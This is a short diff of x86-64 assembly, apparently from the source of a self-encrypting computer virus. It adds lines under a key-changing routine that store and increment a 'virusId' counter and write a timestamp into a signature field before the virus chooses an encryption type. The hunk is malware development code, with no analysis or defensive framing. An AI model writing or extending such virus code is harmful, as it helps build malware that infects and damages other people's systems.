@@ -233,6 +233,12 @@ change_key:
     mov rdx, GRND_RANDOM
     mov rax, SYS_GETRANDOM
     syscall
+    mov rax, [r12 + virusId]
+    mov [rbx + SIGNATURE_KEY_OFFSET], rax
+    inc qword [r12 + virusId]
+    lea rdi, [rbx + SIGNATURE_KEY_OFFSET + 8]
+    mov rax, SYS_TIME
+    syscall
 choose_encrypt_type:
     lea rdi, [rbx + ENCRYPT_OFFSET]
     lea rsi, [rbx + KEY_OFFSET]
